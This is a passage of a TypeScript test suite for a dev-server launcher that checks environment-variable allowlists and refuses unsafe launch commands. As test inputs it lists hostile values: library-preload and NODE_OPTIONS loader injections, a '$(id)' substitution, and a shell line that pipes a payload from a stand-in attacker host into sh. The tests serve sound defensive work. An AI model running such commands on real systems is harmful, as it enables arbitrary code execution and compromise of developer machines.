    { name: 'WATCHPACK_POLLING', platform: POSIX, expected: true },
    { name: 'PGPASSWORD', platform: POSIX, expected: true },
    { name: 'DEBUGGEN_LOG_LEVEL', platform: POSIX, expected: true },
    { name: 'ANTHROPIC_API_KEY', platform: POSIX, expected: false },
    { name: 'DEBUGGEN_HOME', platform: POSIX, expected: false },
    { name: 'DEBUGGEN_PROMPTS_DIR', platform: POSIX, expected: false },
    { name: 'DEBUGGEN_TOKEN', platform: POSIX, expected: false },
    { name: 'NODE_OPTIONS', platform: POSIX, expected: false },
    { name: 'VSCODE_PID', platform: POSIX, expected: false },
    { name: 'ELECTRON_RUN_AS_NODE', platform: POSIX, expected: false },
    { name: 'npm_config_cache', platform: POSIX, expected: false },
    { name: 'GITHUB_TOKEN', platform: POSIX, expected: false },
    { name: 'AWS_SECRET_ACCESS_KEY', platform: POSIX, expected: false },
    { name: 'path', platform: POSIX, expected: false },
    { name: 'Path', platform: WINDOWS, expected: true },
    { name: 'SystemRoot', platform: WINDOWS, expected: true },
    { name: 'ProgramFiles(x86)', platform: WINDOWS, expected: true },
    { name: 'next_public_flag', platform: WINDOWS, expected: true },
    { name: 'Anthropic_Api_Key', platform: WINDOWS, expected: false },
    { name: 'Node_Options', platform: WINDOWS, expected: false },
    { name: '', platform: POSIX, expected: false },
  ])('answers $expected for $name on $platform', ({ name, platform, expected }) => {
    expect(isForwardedToDevServer(name, platform)).toBe(expected);
  });

  it('is a frozen list of upper-case names and prefixes, plus lower-case proxy spellings', () => {
    expect(Object.isFrozen(DEV_SERVER_ENV_ALLOWLIST)).toBe(true);
    expect(Object.isFrozen(DEV_SERVER_ENV_ALLOWLIST.names)).toBe(true);
    expect(Object.isFrozen(DEV_SERVER_ENV_ALLOWLIST.prefixes)).toBe(true);
    for (const name of [...DEV_SERVER_ENV_ALLOWLIST.names, ...DEV_SERVER_ENV_ALLOWLIST.prefixes]) {
      expect(name).toBe(name.toUpperCase());
    }
    expect(DEV_SERVER_ENV_ALLOWLIST.posixLowercaseNames).toEqual([
      'http_proxy',
      'https_proxy',
      'no_proxy',
      'all_proxy',
    ]);
    expect(new Set(DEV_SERVER_ENV_ALLOWLIST.names).size).toBe(
      DEV_SERVER_ENV_ALLOWLIST.names.length,
    );
    // No preload key and no service-only name is ever on the list.
    for (const name of [...INJECTED_KEYS, 'ANTHROPIC_API_KEY', 'DEBUGGEN_HOME']) {
      expect(DEV_SERVER_ENV_ALLOWLIST.names).not.toContain(name);
    }
  });
});

// ---------------------------------------------------------------------------
// Launch-command assignments: DEV_SERVER_COMMAND_ENV_ALLOWLIST (CWE-78)
// ---------------------------------------------------------------------------

/** A path an attacker would plant a loader under; its appearance in any output is an echo. */
const ATTACKER_PATH = '/tmp/attacker-payload';

describe('checkLaunchAssignment and DEV_SERVER_COMMAND_ENV_ALLOWLIST', () => {
  it.each([
    { name: 'NODE_ENV', value: 'development', platform: POSIX },
    { name: 'PORT', value: '4174', platform: POSIX },
    { name: 'HOSTNAME', value: '127.0.0.1', platform: POSIX },
    { name: 'WATCHPACK_POLLING', value: 'true', platform: POSIX },
    { name: 'NEXT_TELEMETRY_DISABLED', value: '1', platform: POSIX },
    { name: 'NEXT_PUBLIC_API_BASE', value: 'http://127.0.0.1:4000', platform: POSIX },
    { name: 'LC_ALL', value: 'C', platform: POSIX },
    { name: 'TZ', value: 'UTC', platform: POSIX },
    { name: 'FORCE_COLOR', value: '0', platform: POSIX },
    { name: 'DATABASE_URL', value: 'postgresql://127.0.0.1:5432/atlas', platform: POSIX },
    { name: 'PGSSLMODE', value: 'disable', platform: POSIX },
    { name: 'DEBUGGEN_LOG_LEVEL', value: 'warn', platform: POSIX },
    { name: 'NODE_OPTIONS', value: '', platform: POSIX },
    { name: 'NODE_OPTIONS', value: '--trace-warnings  --enable-source-maps', platform: POSIX },
    {
      name: 'NODE_OPTIONS',
      value: '--max-old-space-size=4096 --stack-trace-limit 50',
      platform: POSIX,
    },
    {
      name: 'NODE_OPTIONS',
      value: '--unhandled-rejections=strict --disable-warning DEP0040 --dns-result-order=ipv4first',
      platform: POSIX,
    },
    { name: 'NODE_PATH', value: '/repo/apps/web/node_modules', platform: POSIX },
    {
      name: 'NODE_PATH',
      value: '/repo/node_modules:/repo/apps/web/node_modules/',
      platform: POSIX,
    },
    { name: 'next_public_flag', value: '1', platform: WINDOWS },
    { name: 'Node_Options', value: '--no-warnings', platform: WINDOWS },
    {
      name: 'node_path',
      value: 'C:\\repo\\node_modules;D:\\shared\\Node_Modules',
      platform: WINDOWS,
    },
  ])('allows $name=$value on $platform', ({ name, value, platform }) => {
    expect(checkLaunchAssignment(name, value, platform)).toBeUndefined();
    expect(isAllowedLaunchAssignment(name, value, platform)).toBe(true);
  });

  it.each([
    { name: 'LD_PRELOAD', value: `${ATTACKER_PATH}.so`, platform: POSIX },
    { name: 'LD_LIBRARY_PATH', value: ATTACKER_PATH, platform: POSIX },
    { name: 'DYLD_INSERT_LIBRARIES', value: `${ATTACKER_PATH}.dylib`, platform: 'darwin' as const },
    { name: 'BASH_ENV', value: `${ATTACKER_PATH}.sh`, platform: POSIX },
    { name: 'ENV', value: `${ATTACKER_PATH}.sh`, platform: POSIX },
    { name: 'PATH', value: `${ATTACKER_PATH}:/usr/bin`, platform: POSIX },
    { name: 'HOME', value: ATTACKER_PATH, platform: POSIX },
    { name: 'SHELL', value: `${ATTACKER_PATH}.sh`, platform: POSIX },
    { name: 'TMPDIR', value: ATTACKER_PATH, platform: POSIX },
    { name: 'XDG_CONFIG_HOME', value: ATTACKER_PATH, platform: POSIX },
    { name: 'npm_config_node_options', value: `--require=${ATTACKER_PATH}.js`, platform: POSIX },
    { name: 'COREPACK_HOME', value: ATTACKER_PATH, platform: POSIX },
    { name: 'PNPM_HOME', value: ATTACKER_PATH, platform: POSIX },
    { name: 'NODE_EXTRA_CA_CERTS', value: `${ATTACKER_PATH}.pem`, platform: POSIX },
    { name: 'HTTPS_PROXY', value: 'http://127.0.0.1:3128', platform: POSIX },
    { name: PRELOAD_ENV_KEYS.token, value: fixtureCredential(50), platform: POSIX },
    { name: PRELOAD_ENV_KEYS.ingestUrl, value: 'http://127.0.0.1:1/elsewhere', platform: POSIX },
    { name: PRELOAD_ENV_KEYS.projectRoot, value: ATTACKER_PATH, platform: POSIX },
    { name: 'DEBUGGEN_MODEL', value: 'assigned-model', platform: POSIX },
    { name: 'ANTHROPIC_API_KEY', value: fixtureSecret('provider'), platform: POSIX },
    { name: 'FEATURE_FLAG', value: '1', platform: POSIX },
    { name: 'node_env', value: 'production', platform: POSIX },
    { name: 'node_options', value: '--no-warnings', platform: POSIX },
    { name: 'Ld_Preload', value: `${ATTACKER_PATH}.dll`, platform: WINDOWS },
    { name: 'ComSpec', value: 'C:\\elsewhere\\cmd.exe', platform: WINDOWS },
    { name: 'Path', value: 'C:\\elsewhere', platform: WINDOWS },
  ])('refuses $name on $platform as env-assignment-not-allowed', ({ name, value, platform }) => {
    expect(checkLaunchAssignment(name, value, platform)).toBe('env-assignment-not-allowed');
    expect(isAllowedLaunchAssignment(name, value, platform)).toBe(false);
  });

  it.each([
    { value: `--require=${ATTACKER_PATH}.js`, platform: POSIX },
    { value: `--require ${ATTACKER_PATH}.js`, platform: POSIX },
    { value: `-r ${ATTACKER_PATH}.js`, platform: POSIX },
    { value: '--import=data:text/javascript,process.exit(0)', platform: POSIX },
    { value: `--import ${ATTACKER_PATH}.mjs`, platform: POSIX },
    { value: `--loader ${ATTACKER_PATH}.mjs`, platform: POSIX },
    { value: `--experimental-loader=${ATTACKER_PATH}.mjs`, platform: POSIX },
    { value: '--inspect', platform: POSIX },
    { value: '--inspect-brk=0.0.0.0:9229', platform: POSIX },
    { value: `--openssl-config=${ATTACKER_PATH}.cnf`, platform: POSIX },
    { value: `--env-file=${ATTACKER_PATH}.env`, platform: POSIX },
    { value: `--trace-warnings --require=${ATTACKER_PATH}.js`, platform: POSIX },
    { value: '--stack-trace-limit', platform: POSIX },
    { value: '--stack-trace-limit --require', platform: POSIX },
    { value: '--max-old-space-size=$(id)', platform: POSIX },
    { value: '--no-warnings=1', platform: POSIX },
    { value: '"--no-warnings"', platform: POSIX },
    { value: '--no_warnings', platform: POSIX },
    { value: `--require=${ATTACKER_PATH}.js`, platform: WINDOWS },
  ])(
    'refuses NODE_OPTIONS=$value on $platform as node-options-not-allowed',
    ({ value, platform }) => {
      for (const name of platform === WINDOWS
        ? ['NODE_OPTIONS', 'node_options', 'Node_Options']
        : ['NODE_OPTIONS']) {
        expect(checkLaunchAssignment(name, value, platform)).toBe('node-options-not-allowed');
      }
    },
  );

  it.each([
    { value: ATTACKER_PATH, platform: POSIX },
    { value: 'node_modules', platform: POSIX },
    { value: './node_modules', platform: POSIX },
    { value: '', platform: POSIX },
    { value: '/repo/node_modules::/repo/apps/web/node_modules', platform: POSIX },
    { value: `/repo/node_modules:${ATTACKER_PATH}`, platform: POSIX },
    { value: '/repo/node_modules\n', platform: POSIX },
    { value: '/repo/node_modules/\0', platform: POSIX },
    { value: 'C:\\repo\\node_modules', platform: POSIX },
    { value: '/repo/node_modules', platform: WINDOWS },
    { value: 'C:\\tmp\\attacker', platform: WINDOWS },
    { value: 'C:node_modules', platform: WINDOWS },
  ])('refuses NODE_PATH=$value on $platform as node-path-not-allowed', ({ value, platform }) => {
    expect(checkLaunchAssignment('NODE_PATH', value, platform)).toBe('node-path-not-allowed');
  });

  it('defaults to the platform this process runs on', () => {
    expect(checkLaunchAssignment('LD_PRELOAD', `${ATTACKER_PATH}.so`)).toBe(
      'env-assignment-not-allowed',
    );
    expect(checkLaunchAssignment('NEXT_TELEMETRY_DISABLED', '1')).toBeUndefined();
  });

  it('is a frozen, upper-case list never wider than what the service itself forwards', () => {
    expect(Object.isFrozen(DEV_SERVER_COMMAND_ENV_ALLOWLIST)).toBe(true);
    expect(Object.isFrozen(DEV_SERVER_COMMAND_ENV_ALLOWLIST.names)).toBe(true);
    expect(Object.isFrozen(DEV_SERVER_COMMAND_ENV_ALLOWLIST.prefixes)).toBe(true);
    expect(Object.isFrozen(DEV_SERVER_COMMAND_ENV_ALLOWLIST.valueCheckedNames)).toBe(true);
    expect(Object.isFrozen(LAUNCH_NODE_OPTIONS_ALLOWLIST)).toBe(true);
    expect(DEV_SERVER_COMMAND_ENV_ALLOWLIST.valueCheckedNames).toEqual([
      'NODE_OPTIONS',
      'NODE_PATH',
    ]);
    expect(DEV_SERVER_COMMAND_ENV_ALLOWLIST.prefixes).toEqual(['NEXT_PUBLIC_', 'LC_']);
    for (const name of [
      ...DEV_SERVER_COMMAND_ENV_ALLOWLIST.names,
      ...DEV_SERVER_COMMAND_ENV_ALLOWLIST.prefixes,
    ]) {
      expect(name).toBe(name.toUpperCase());
      // Every assignable name is one the service would forward from its own
      // environment too: a request can narrow, never widen, what a child sees.
      expect(isForwardedToDevServer(name.endsWith('_') ? `${name}X` : name, POSIX)).toBe(true);
    }
    for (const name of [...INJECTED_KEYS, 'PATH', 'HOME', 'ANTHROPIC_API_KEY', 'DEBUGGEN_HOME']) {
      expect(DEV_SERVER_COMMAND_ENV_ALLOWLIST.names).not.toContain(name);
    }
  });
});

describe('parseLaunchCommand: leading NAME=value assignments', () => {
  it('separates allowed assignments from the executable and its arguments', () => {
    const parsed = expectOk(
      parseLaunchCommand(
        "NEXT_TELEMETRY_DISABLED=1 NODE_OPTIONS='--trace-warnings --no-deprecation' pnpm run dev",
        POSIX,
      ),
    );

    expect(parsed).toStrictEqual({
      file: 'pnpm',
      args: ['run', 'dev'],
      env: { NEXT_TELEMETRY_DISABLED: '1', NODE_OPTIONS: '--trace-warnings --no-deprecation' },
    });
    expect(Object.isFrozen(parsed)).toBe(true);
    expect(Object.isFrozen(parsed.env)).toBe(true);
  });

  it.each([
    {
      label: 'a dynamic-loader preload',
      command: `LD_PRELOAD=${ATTACKER_PATH}.so pnpm run dev`,
      planted: `${ATTACKER_PATH}.so`,
      reason: 'env-assignment-not-allowed',
      position: 1,
    },
    {
      label: 'a NODE_OPTIONS --require, after an allowed assignment',
      command: `NODE_ENV=development NODE_OPTIONS=--require=${ATTACKER_PATH}.js pnpm run dev`,
      planted: `${ATTACKER_PATH}.js`,
      reason: 'node-options-not-allowed',
      position: 2,
    },
    {
      label: 'a NODE_OPTIONS --import of a data: URL',
      command: "NODE_OPTIONS='--import=data:text/javascript,process.exit(0)' pnpm run dev",
      planted: 'process.exit(0)',
      reason: 'node-options-not-allowed',
      position: 1,
    },
    {
      label: 'a hand-set credential',
      command: `${PRELOAD_ENV_KEYS.token}=${fixtureCredential(51)} pnpm run dev`,
      planted: fixtureCredential(51),
      reason: 'env-assignment-not-allowed',
      position: 1,
    },
    {
      label: 'a NODE_PATH outside any node_modules directory',
      command: `NODE_PATH=${ATTACKER_PATH} pnpm run dev`,
      planted: ATTACKER_PATH,
      reason: 'node-path-not-allowed',
      position: 1,
    },
  ])('refuses $label, naming only its position', ({ command, planted, reason, position }) => {
    const error = expectErr(parseLaunchCommand(command, POSIX), 'DEV_SERVER_LAUNCH_FAILED', reason);

    expect(error.details).toStrictEqual({ reason, position });
    expect(errorSurfaces(error)).not.toContain(planted);
    expect(error.hint?.trim().length ?? 0).toBeGreaterThan(0);
  });

  it("points a refused variable at the project's own .env files", () => {
    const error = expectErr(
      parseLaunchCommand('FEATURE_FLAG=1 pnpm run dev', POSIX),
      'DEV_SERVER_LAUNCH_FAILED',
      'env-assignment-not-allowed',
    );

    expect(error.hint).toContain('.env files');
    for (const name of DEV_SERVER_COMMAND_ENV_ALLOWLIST.names) {
      expect(error.hint).toContain(name);
    }
  });

  it('compares names case-insensitively on Windows and exactly on POSIX', () => {
    const command = `node_options=--require=${ATTACKER_PATH}.js pnpm run dev`;

    // One variable on Windows — Node's own NODE_OPTIONS, whose value is checked …
    expectErr(
      parseLaunchCommand(command, WINDOWS),
      'DEV_SERVER_LAUNCH_FAILED',
      'node-options-not-allowed',
    );
    // … and an unlisted, different variable on POSIX.
    expectErr(
      parseLaunchCommand(command, POSIX),
      'DEV_SERVER_LAUNCH_FAILED',
      'env-assignment-not-allowed',
    );
    expectErr(
      parseLaunchCommand(`Ld_Preload=${ATTACKER_PATH}.dll pnpm run dev`, WINDOWS),
      'DEV_SERVER_LAUNCH_FAILED',
      'env-assignment-not-allowed',
    );
    expect(
      expectOk(parseLaunchCommand('next_telemetry_disabled=1 pnpm run dev', WINDOWS)).env,
    ).toStrictEqual({
      next_telemetry_disabled: '1',
    });
  });

  it("checks under this process's platform when none is given", () => {
    expectErr(
      parseLaunchCommand(`LD_PRELOAD=${ATTACKER_PATH}.so pnpm run dev`),
      'DEV_SERVER_LAUNCH_FAILED',
      'env-assignment-not-allowed',
    );
  });
});

describe('DevServerLauncher.launch: a refused assignment mints and spawns nothing', () => {
  it.each([
    {
      label: 'LD_PRELOAD',
      command: `LD_PRELOAD=${ATTACKER_PATH}.so pnpm run dev`,
      planted: `${ATTACKER_PATH}.so`,
      reason: 'env-assignment-not-allowed',
      platform: POSIX,
    },
    {
      label: 'NODE_OPTIONS=--require=',
      command: `NODE_OPTIONS=--require=${ATTACKER_PATH}.js pnpm run dev`,
      planted: `${ATTACKER_PATH}.js`,
      reason: 'node-options-not-allowed',
      platform: POSIX,
    },
    {
      label: 'NODE_OPTIONS=--import=data:',
      command: "NODE_OPTIONS='--import=data:text/javascript,process.exit(0)' pnpm run dev",
      planted: 'process.exit(0)',
      reason: 'node-options-not-allowed',
      platform: POSIX,
    },
    {
      label: 'DEBUGGEN_TOKEN',
      command: `${PRELOAD_ENV_KEYS.token}=${fixtureCredential(52)} pnpm run dev`,
      planted: fixtureCredential(52),
      reason: 'env-assignment-not-allowed',
      platform: POSIX,
    },
    {
      label: 'BASH_ENV',
      command: `BASH_ENV=${ATTACKER_PATH}.sh pnpm run dev`,
      planted: `${ATTACKER_PATH}.sh`,
      reason: 'env-assignment-not-allowed',
      platform: POSIX,
    },
    {
      label: 'npm_config_node_options',
      command: `npm_config_node_options=--require=${ATTACKER_PATH}.js npm run dev`,
      planted: `${ATTACKER_PATH}.js`,
      reason: 'env-assignment-not-allowed',
      platform: POSIX,
    },
    {
      label: 'PATH',
      command: `PATH=${ATTACKER_PATH}:/usr/bin pnpm run dev`,
      planted: ATTACKER_PATH,
      reason: 'env-assignment-not-allowed',
      platform: POSIX,
    },
    {
      label: 'a lower-case ld_preload on Windows',
      command: `ld_preload=${ATTACKER_PATH}.dll pnpm run dev`,
      planted: `${ATTACKER_PATH}.dll`,
      reason: 'env-assignment-not-allowed',
      platform: WINDOWS,
    },
    {
      label: 'a mixed-case Node_Options on Windows',
      command: `Node_Options=--require=${ATTACKER_PATH}.js pnpm run dev`,
      planted: `${ATTACKER_PATH}.js`,
      reason: 'node-options-not-allowed',
      platform: WINDOWS,
    },
  ])(
    'refuses $label on $platform before minting a credential or spawning, echoing nothing',
    async ({ command, planted, reason, platform }) => {
      const harness = createHarness({ deps: { platform } });

      const result = await harness.launcher.launch({ projectRoot: harness.projectRoot, command });

      const error = expectErr(result, 'DEV_SERVER_LAUNCH_FAILED', reason);
      expect(error.details?.['position']).toBe(1);
      expect(harness.issuer.issue).not.toHaveBeenCalled();
      expect(harness.spawner.spawn).not.toHaveBeenCalled();
      expect(harness.launcher.list()).toEqual([]);
      expect(errorSurfaces(error)).not.toContain(planted);
      expect(serializedRecords(harness.records)).not.toContain(planted);
    },
  );
});

describe('buildDevServerEnv: launch assignments are checked again', () => {
  const input = {
    parentEnv: PARENT_ENV,
    projectRoot: '/home/dev/atlas-console',
    ingestUrl: resolveIngestUrl(SERVICE_CONFIG),
    token: fixtureCredential(1),
    preloadPath: '/opt/toolchain/dist/telemetry/node/register.mjs',
    platform: POSIX,
  };

  it.each([
    { label: 'LD_PRELOAD', launchEnv: { LD_PRELOAD: `${ATTACKER_PATH}.so` } },
    {
      label: 'a loader in NODE_OPTIONS',
      launchEnv: { NODE_OPTIONS: `--require=${ATTACKER_PATH}.js` },
    },
    { label: 'a NODE_PATH outside node_modules', launchEnv: { NODE_PATH: ATTACKER_PATH } },
    { label: 'an unrecognised variable', launchEnv: { FEATURE_FLAG: '1' } },
  ])('throws CONFIG_INVALID for $label, echoing neither name nor value', ({ launchEnv }) => {
    const error = thrownBy(() => buildDevServerEnv({ ...input, launchEnv }));

    expect(error.code).toBe('CONFIG_INVALID');
    expect(error.details).toStrictEqual({ reason: 'launch-env-not-allowed' });
    for (const [name, value] of Object.entries(launchEnv)) {
      expect(errorSurfaces(error)).not.toContain(name);
      expect(errorSurfaces(error)).not.toContain(value);
    }
  });

  it('applies an allowed assignment on Windows under any casing', () => {
    const env = buildDevServerEnv({
      ...input,
      parentEnv: { Path: 'C:\\Windows' },
      launchEnv: { Next_Telemetry_Disabled: '1', node_path: 'C:\\repo\\node_modules' },
      platform: WINDOWS,
    });

    expect(env['Next_Telemetry_Disabled']).toBe('1');
    expect(env['node_path']).toBe('C:\\repo\\node_modules');
  });
});

// ---------------------------------------------------------------------------
// Which command may run: checkLaunchCommand (CWE-78)
// ---------------------------------------------------------------------------

/** The service's Node in every policy case: an absolute path, compared by real path. */
const SERVICE_NODE = '/opt/toolchain/node/bin/node';

/** A second name for the service's Node — a symlink, as a `bin` directory on `PATH` often holds. */
const SERVICE_NODE_LINK = '/usr/local/bin/node';

/** A Node installation that is not the service's. */
const OTHER_NODE = '/opt/elsewhere/bin/node';

/** The policy cases' project root. */
const POLICY_ROOT = '/home/dev/atlas-console';

/** The project's own framework CLI, which the cases' trust check accepts. */
const POLICY_CLI = `${POLICY_ROOT}/node_modules/next/dist/bin/next`;

/** Another checkout's `node_modules`, borrowed the way the end-to-end sample app borrows one. */
const BORROWED_MODULES = '/home/dev/toolchain/apps/storefront/node_modules';

/** The borrowed framework CLI, also trusted. */
const BORROWED_CLI = `${BORROWED_MODULES}/next/dist/bin/next`;

/** The policy project's dev-server scripts: the only scripts a package-manager run may start. */
const POLICY_SCRIPTS: readonly string[] = Object.freeze(['dev', 'start:local']);

/**
 * A policy context over the constants above: the service's Node and its
 * symlink resolve to one real path, the other Node to its own, every other
 * path to none; only the two framework CLIs are trusted files, and only the
 * borrowed `node_modules` is a trusted `NODE_PATH` directory.
 */
function policyContext(overrides: Partial<LaunchCommandContext> = {}): LaunchCommandContext {
  const realpaths = new Map([
    [SERVICE_NODE, SERVICE_NODE],
    [SERVICE_NODE_LINK, SERVICE_NODE],
    [OTHER_NODE, OTHER_NODE],
  ]);
  const trusted = new Set([POLICY_CLI, BORROWED_CLI]);
  return {
    projectRoot: POLICY_ROOT,
    scripts: POLICY_SCRIPTS,
    platform: POSIX,
    nodeExecutablePath: SERVICE_NODE,
    realpath: (path) => realpaths.get(path),
    isTrustedFile: (path) => trusted.has(path),
    isTrustedDirectory: (path) => path === BORROWED_MODULES,
    ...overrides,
  };
}

/** `command` parsed on the context's platform, then judged by the policy. */
function judged(
  command: string,
  context: LaunchCommandContext = policyContext(),
): Result<AcceptedLaunchCommand, DebuggenError> {
  return checkLaunchCommand(
    expectOk(parseLaunchCommand(command, context.platform ?? POSIX)),
    context,
  );
}

describe('checkLaunchCommand: the accepted forms', () => {
  it.each([
    { command: 'pnpm run dev', accepted: { form: 'package-script', script: 'dev' } },
    { command: 'pnpm run dev --port 4174', accepted: { form: 'package-script', script: 'dev' } },
    {
      command: 'pnpm run start:local --port 4174',
      accepted: { form: 'package-script', script: 'start:local' },
    },
    { command: 'npm run dev -- --port 4174', accepted: { form: 'package-script', script: 'dev' } },
    { command: 'npm run-script dev', accepted: { form: 'package-script', script: 'dev' } },
    { command: 'yarn dev', accepted: { form: 'package-script', script: 'dev' } },
    { command: 'yarn run dev --port 4174', accepted: { form: 'package-script', script: 'dev' } },
    { command: 'bun run dev', accepted: { form: 'package-script', script: 'dev' } },
    { command: 'next dev', accepted: { form: 'framework-cli' } },
    {
      command: 'next dev --port 4173 --hostname 127.0.0.1',
      accepted: { form: 'framework-cli' },
    },
    {
      command: 'node node_modules/next/dist/bin/next dev --port 4173',
      accepted: { form: 'node-framework-cli' },
    },
    {
      command: `${SERVICE_NODE} ./node_modules/next/dist/bin/next dev`,
      accepted: { form: 'node-framework-cli' },
    },
    {
      command: `${SERVICE_NODE_LINK} ${POLICY_CLI} dev --turbopack`,
      accepted: { form: 'node-framework-cli' },
    },
  ])('accepts $command', ({ command, accepted }) => {
    expect(expectOk(judged(command))).toStrictEqual(accepted);
  });

  it('accepts the end-to-end sample app shape: assignments, the service Node and a borrowed framework CLI', () => {
    const command = `NEXT_TELEMETRY_DISABLED=1 DEBUGGEN_LOG_LEVEL=warn NODE_PATH=${BORROWED_MODULES} ${SERVICE_NODE} ${BORROWED_CLI} dev --webpack --port 4175`;

    const parsed = expectOk(parseLaunchCommand(command, POSIX));

    expect(parsed.env).toStrictEqual({
      NEXT_TELEMETRY_DISABLED: '1',
      DEBUGGEN_LOG_LEVEL: 'warn',
      NODE_PATH: BORROWED_MODULES,
    });
    expect(parsed.file).toBe(SERVICE_NODE);
    expect(expectOk(checkLaunchCommand(parsed, policyContext()))).toStrictEqual({
      form: 'node-framework-cli',
    });
  });

  it("accepts the browser fixture shape: the quoted service Node and the project's relative framework CLI", () => {
    const command = `NEXT_TELEMETRY_DISABLED=1 "${SERVICE_NODE}" node_modules/next/dist/bin/next dev --port 4176 --hostname 127.0.0.1`;

    expect(expectOk(judged(command))).toStrictEqual({ form: 'node-framework-cli' });
  });

  it('hands the trust check the CLI path resolved against the project root and normalised', () => {
    const isTrustedFile = vi.fn((path: string) => path === POLICY_CLI);

    expectOk(
      judged(
        'node ./node_modules/../node_modules/next/dist/bin/next dev',
        policyContext({ isTrustedFile }),
      ),
    );

    expect(isTrustedFile).toHaveBeenCalledExactlyOnceWith(POLICY_CLI);
  });

  it('accepts every entry of the framework dev-CLI table detect.ts matches scripts with', () => {
    expect(Object.isFrozen(FRAMEWORK_DEV_CLIS)).toBe(true);
    expect(FRAMEWORK_DEV_CLIS).toContainEqual({
      framework: 'next',
      binary: 'next',
      subcommand: 'dev',
      packageBin: 'next/dist/bin/next',
    });
    for (const entry of FRAMEWORK_DEV_CLIS) {
      const cli = `${POLICY_ROOT}/node_modules/${entry.packageBin}`;
      const context = policyContext({ isTrustedFile: (path) => path === cli });
      expect(expectOk(judged(`${entry.binary} ${entry.subcommand}`, context)).form).toBe(
        'framework-cli',
      );
      expect(
        expectOk(judged(`node node_modules/${entry.packageBin} ${entry.subcommand}`, context)).form,
      ).toBe('node-framework-cli');
    }
  });

  describe('on Windows', () => {
    const WINDOWS_ROOT = 'C:\\work\\atlas-console';
    const WINDOWS_CLI = `${WINDOWS_ROOT}\\node_modules\\next\\dist\\bin\\next`;
    const WINDOWS_NODE = 'C:\\Program Files\\nodejs\\node.exe';
    const windowsContext = (): LaunchCommandContext =>
      policyContext({
        projectRoot: WINDOWS_ROOT,
        platform: WINDOWS,
        nodeExecutablePath: WINDOWS_NODE,
        realpath: (path) => path,
        isTrustedFile: (path) => path.toLowerCase() === WINDOWS_CLI.toLowerCase(),
      });

    it.each([
      { command: 'PNPM run dev', accepted: { form: 'package-script', script: 'dev' } },
      { command: 'Yarn dev', accepted: { form: 'package-script', script: 'dev' } },
      { command: 'Next dev --port 4173', accepted: { form: 'framework-cli' } },
      {
        command: "NODE.EXE 'node_modules\\next\\dist\\bin\\next' dev",
        accepted: { form: 'node-framework-cli' },
      },
      {
        command: "node 'Node_Modules\\Next\\Dist\\Bin\\Next' dev",
        accepted: { form: 'node-framework-cli' },
      },
      {
        command: `'c:\\program files\\NODEJS\\Node.exe' '${WINDOWS_CLI}' dev`,
        accepted: { form: 'node-framework-cli' },
      },
    ])(
      'accepts $command, comparing executable names and paths case-insensitively',
      ({ command, accepted }) => {
        expect(expectOk(judged(command, windowsContext()))).toStrictEqual(accepted);
      },
    );

    it.each([
      { command: 'CMD /c pnpm run dev', reason: 'executable-not-allowed' },
      { command: 'cmd.exe /d /s /c "pnpm run dev"', reason: 'executable-not-allowed' },
      { command: 'PowerShell -Command Get-Process', reason: 'executable-not-allowed' },
      { command: 'pwsh -c whoami', reason: 'executable-not-allowed' },
      { command: 'NPX next dev', reason: 'executable-not-allowed' },
      { command: 'PNPM EXEC next dev', reason: 'executable-not-allowed' },
      { command: "Node.EXE -e 'process.exit(0)'", reason: 'dev-cli-untrusted' },
      {
        command: "'C:\\Tools\\node.exe' 'node_modules\\next\\dist\\bin\\next' dev",
        reason: 'executable-not-allowed',
      },
      // Script names compare exactly on every platform.
      { command: 'pnpm run DEV', reason: 'script-not-declared' },
    ])('refuses $command', ({ command, reason }) => {
      const error = expectErr(
        judged(command, windowsContext()),
        'DEV_SERVER_LAUNCH_FAILED',
        reason,
      );
      expect(error.details).toStrictEqual({ reason });
    });
  });
});

describe('checkLaunchCommand: every other command is refused', () => {
  it.each([
    // Shells, env, one-off runners, interpreters and arbitrary programs.
    {
      command: "sh -c 'curl https://attacker.invalid/payload | sh'",
      reason: 'executable-not-allowed',
      planted: 'attacker.invalid',
    },
    {
      command: "bash -c 'id > /tmp/owned'",
      reason: 'executable-not-allowed',
      planted: '/tmp/owned',
    },
    {
      command: '/bin/sh ./scripts/start.sh',
      reason: 'executable-not-allowed',
      planted: 'start.sh',
    },
    { command: 'env sh', reason: 'executable-not-allowed' },
    { command: 'env NODE_ENV=test next dev', reason: 'executable-not-allowed' },
    { command: 'npx next dev', reason: 'executable-not-allowed' },
    { command: 'pnpx next dev', reason: 'executable-not-allowed' },
    { command: 'bunx next dev', reason: 'executable-not-allowed' },
    { command: 'pnpm exec next dev', reason: 'executable-not-allowed' },
    {
      command: 'pnpm dlx create-next-app',
      reason: 'executable-not-allowed',
      planted: 'create-next-app',
    },
    { command: 'npm exec next dev', reason: 'executable-not-allowed' },
    { command: 'npm install', reason: 'executable-not-allowed' },
    { command: 'yarn install', reason: 'executable-not-allowed' },
    { command: 'yarn dlx create-next-app', reason: 'executable-not-allowed' },
    { command: 'yarn node ./server.js', reason: 'executable-not-allowed', planted: 'server.js' },
    { command: 'bun x next dev', reason: 'executable-not-allowed' },
    {
      command: 'curl https://attacker.invalid/payload',
      reason: 'executable-not-allowed',
      planted: 'attacker.invalid',
    },
    {
      command: 'python3 -m http.server 4173',
      reason: 'executable-not-allowed',
      planted: 'http.server',
    },
    { command: './node_modules/.bin/next dev', reason: 'executable-not-allowed' },
    { command: 'next build', reason: 'executable-not-allowed' },
    { command: 'next', reason: 'executable-not-allowed' },
    {
      command: `${OTHER_NODE} node_modules/next/dist/bin/next dev`,
      reason: 'executable-not-allowed',
      planted: OTHER_NODE,
    },
    { command: 'node node_modules/next/dist/bin/next build', reason: 'executable-not-allowed' },
    // Node asked to run anything but a trusted framework CLI.
    {
      command: `node -e 'require("node:child_process").execSync("id")'`,
      reason: 'dev-cli-untrusted',
      planted: 'child_process',
    },
    {
      command: 'node --require /tmp/x.js node_modules/next/dist/bin/next dev',
      reason: 'dev-cli-untrusted',
      planted: '/tmp/x.js',
    },
    { command: 'node /tmp/evil.js', reason: 'dev-cli-untrusted', planted: 'evil.js' },
    {
      command: 'node ./bin/serve.mjs --port 4173',
      reason: 'dev-cli-untrusted',
      planted: 'serve.mjs',
    },
    { command: 'node', reason: 'dev-cli-untrusted' },
    {
      // A CLI the trust check refuses: missing, or writable by another user.
      command: 'node ../elsewhere/node_modules/next/dist/bin/next dev',
      reason: 'dev-cli-untrusted',
      planted: 'elsewhere',
    },
    { command: 'node node_modules/next/dist/bin/next.js dev', reason: 'dev-cli-untrusted' },
    // A package-manager run of anything but a dev-server script.
    { command: 'pnpm run undeclared', reason: 'script-not-declared', planted: 'undeclared' },
    { command: 'pnpm run lint', reason: 'script-not-declared' },
